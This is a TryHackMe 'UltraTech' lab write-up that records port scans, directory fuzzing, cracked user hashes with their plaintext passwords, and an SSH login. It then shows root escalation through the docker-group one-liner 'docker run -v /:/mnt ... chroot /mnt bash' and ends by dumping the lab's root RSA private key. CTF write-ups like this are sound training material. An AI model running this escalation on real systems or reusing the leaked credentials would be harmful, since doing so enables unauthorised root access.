---
title: "UltraTech (Done)"
kind: writeup
tags:
  - tryhackme-rooms
  - status/done
  - writeup
  - linux
  - web
  - challenege
status: "Done"
difficulty: "Medium"
url: "https://tryhackme.com/room/ultratech1"
category:
  - "Challenege"
database: "TryHackMe"
area: "TryHackMe Rooms"
up: "[[TryHackMe]]"
notion-id: be7759b92751836e8d058187c351d511
---

# UltraTech (Done)

In: [[Career]] / [[TryHackMe Rooms]] / [[TryHackMe]]

## Nmap Scan

```bash
┌──(kali㉿Shieldbyte53)-[~]
└─$ nmap -p- --min-rate 1000 -T4 -sV -oA nmap_full_scan 10.49.134.124
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-05 16:59 IST
Stats: 0:00:06 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 81.47% done; ETC: 16:59 (0:00:00 remaining)
Stats: 0:00:21 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 75.00% done; ETC: 16:59 (0:00:04 remaining)
Nmap scan report for 10.49.134.124
Host is up (0.010s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.5
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
8081/tcp  open  http    Node.js Express framework
31331/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.50 seconds
```

## Fuzzing 8081 port

```bash
┌──(kali㉿Shieldbyte53)-[~]
└─$ ffuf -u http://10.49.134.124:8081/FUZZ -w /usr/share/wordlists/dirb/big.txt -r

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.49.134.124:8081/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

auth                    [Status: 200, Size: 39, Words: 8, Lines: 1, Duration: 18ms]
ping                    [Status: 500, Size: 1094, Words: 52, Lines: 11, Duration: 15ms]
:: Progress: [20469/20469] :: Job [1/1] :: 2040 req/sec :: Duration: [0:00:07] :: Errors: 0 ::
```

## Fuzzing 31331 Port

```bash
┌──(kali㉿Shieldbyte53)-[~]
└─$ ffuf -u http://10.49.134.124:31331/FUZZ -w /usr/share/wordlists/dirb/big.txt -r

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.49.134.124:31331/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.htpasswd               [Status: 403, Size: 281, Words: 20, Lines: 10, Duration: 15ms]
.htaccess               [Status: 403, Size: 281, Words: 20, Lines: 10, Duration: 2056ms]
css                     [Status: 200, Size: 1139, Words: 72, Lines: 18, Duration: 10ms]
favicon.ico             [Status: 200, Size: 15086, Words: 11, Lines: 7, Duration: 14ms]
images                  [Status: 200, Size: 4171, Words: 208, Lines: 32, Duration: 10ms]
javascript              [Status: 403, Size: 281, Words: 20, Lines: 10, Duration: 42ms]
js                      [Status: 200, Size: 1324, Words: 91, Lines: 19, Duration: 9ms]
robots.txt              [Status: 200, Size: 53, Words: 4, Lines: 6, Duration: 9ms]
server-status           [Status: 403, Size: 281, Words: 20, Lines: 10, Duration: 9ms]
:: Progress: [20469/20469] :: Job [1/1] :: 3773 req/sec :: Duration: [0:00:09] :: Errors: 0 ::
```

![[attachments/TryHackMe Rooms/TryHackMe/UltraTech (Done)/image.png]]

![[attachments/TryHackMe Rooms/TryHackMe/UltraTech (Done)/image 1.png]]

![[attachments/TryHackMe Rooms/TryHackMe/UltraTech (Done)/image 2.png]]

![[attachments/TryHackMe Rooms/TryHackMe/UltraTech (Done)/image 3.png]]

## users and hashes

```bash
r00tf357a0c52799563c7c7b76c1e7543a32)
admin0d0ea5111e3c1def594c1684e3b9be84

r00t - n100906
admin - mrsheafy
```

## Login with r00t SSH

```bash
┌──(kali㉿Shieldbyte53)-[~]
└─$ ssh r00t@10.48.172.92
The authenticity of host '10.48.172.92 (10.48.172.92)' can't be established.
ED25519 key fingerprint is: SHA256:9iz5lgFT7pflGFFulPg4ejCWSdekghvvrjURzXIfE/Y
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.48.172.92' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
r00t@10.48.172.92's password:
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-139-generic x86_64)
r00t@ip-10-48-172-92:~$ whoami
r00t
```

## Using ID Command

```bash
r00t@ip-10-48-172-92:/$ id
uid=1001(r00t) gid=1001(r00t) groups=1001(r00t),116(docker)
```

## Gaining Root Access

```bash
r00t@ip-10-48-172-92:/$ docker ps
CONTAINER ID   IMAGE     COMMAND   CREATED   STATUS    PORTS     NAMES

r00t@ip-10-48-172-92:/$ docker images
REPOSITORY   TAG       IMAGE ID       CREATED       SIZE
bash         latest    495d6437fc1e   6 years ago   15.8MB

r00t@ip-10-48-172-92:/$ docker run -v /:/mnt --rm -it bash chroot /mnt bash
groups: cannot find name for group ID 11
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

root@26fe258753ae:/# whoami
root
```

## Enumerating private SSH key

```bash
root@26fe258753ae:/# cat /root/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAuDSna2F3pO8vMOPJ4l2PwpLFqMpy1SWYaaREhio64iM65HSm
sIOfoEC+vvs9SRxy8yNBQ2bx2kLYqoZpDJOuTC4Y7VIb+3xeLjhmvtNQGofffkQA
jSMMlh1MG14fOInXKTRQF8hPBWKB38BPdlNgm7dR5PUGFWni15ucYgCGq1Utc5PP
NZVxika+pr/U0Ux4620MzJW899lDG6orIoJo739fmMyrQUjKRnp8xXBv/YezoF8D
hQaP7omtbyo0dczKGkeAVCe6ARh8woiVd2zz5SHDoeZLe1ln4KSbIL3EiMQMzOpc
jNn7oD+rqmh/ygoXL3yFRAowi+LFdkkS0gqgmwIDAQABAoIBACbTwm5Z7xQu7m2J
tiYmvoSu10cK1UWkVQn/fAojoKHF90XsaK5QMDdhLlOnNXXRr1Ecn0cLzfLJoE3h
YwcpodWg6dQsOIW740Yu0Ulr1TiiZzOANfWJ679Akag7IK2UMGwZAMDikfV6nBGD
wbwZOwXXkEWIeC3PUedMf5wQrFI0mG+mRwWFd06xl6FioC9gIpV4RaZT92nbGfoM
BWr8KszHw0t7Cp3CT2OBzL2XoMg/NWFU0iBEBg8n8fk67Y59m49xED7VgupK5Ad1
5neOFdep8rydYbFpVLw8sv96GN5tb/i5KQPC1uO64YuC5ZOyKE30jX4gjAC8rafg
o1macDECgYEA4fTHFz1uRohrRkZiTGzEp9VUPNonMyKYHi2FaSTU1Vmp6A0vbBWW
tnuyiubefzK5DyDEf2YdhEE7PJbMBjnCWQJCtOaSCz/RZ7ET9pAMvo4MvTFs3I97
eDM3HWDdrmrK1hTaOTmvbV8DM9sNqgJVsH24ztLBWRRU4gOsP4a76s0CgYEA0LK/
/kh/lkReyAurcu7F00fIn1hdTvqa8/wUYq5efHoZg8pba2j7Z8g9GVqKtMnFA0w6
t1KmELIf55zwFh3i5MmneUJo6gYSXx2AqvWsFtddLljAVKpbLBl6szq4wVejoDye
lEdFfTHlYaN2ieZADsbgAKs27/q/ZgNqZVI+CQcCgYAO3sYPcHqGZ8nviQhFEU9r
4C04B/9WbStnqQVDoynilJEK9XsueMk/Xyqj24e/BT6KkVR9MeI1ZvmYBjCNJFX2
96AeOaJY3S1RzqSKsHY2QDD0boFEjqjIg05YP5y3Ms4AgsTNyU8TOpKCYiMnEhpD
kDKOYe5Zh24Cpc07LQnG7QKBgCZ1WjYUzBY34TOCGwUiBSiLKOhcU02TluxxPpx0
v4q2wW7s4m3nubSFTOUYL0ljiT+zU3qm611WRdTbsc6RkVdR5d/NoiHGHqqSeDyI
6z6GT3CUAFVZ01VMGLVgk91lNgz4PszaWW7ZvAiDI/wDhzhx46Ob6ZLNpWm6JWgo
gLAPAoGAdCXCHyTfKI/80YMmdp/k11Wj4TQuZ6zgFtUorstRddYAGt8peW3xFqLn
MrOulVZcSUXnezTs3f8TCsH1Yk/2ue8+GmtlZe/3pHRBW0YJIAaHWg5k2I3hsdAz
bPB7E9hlrI0AconivYDzfpxfX+vovlP/DdNVub/EO7JSO+RAmqo=
-----END RSA PRIVATE KEY-----
```
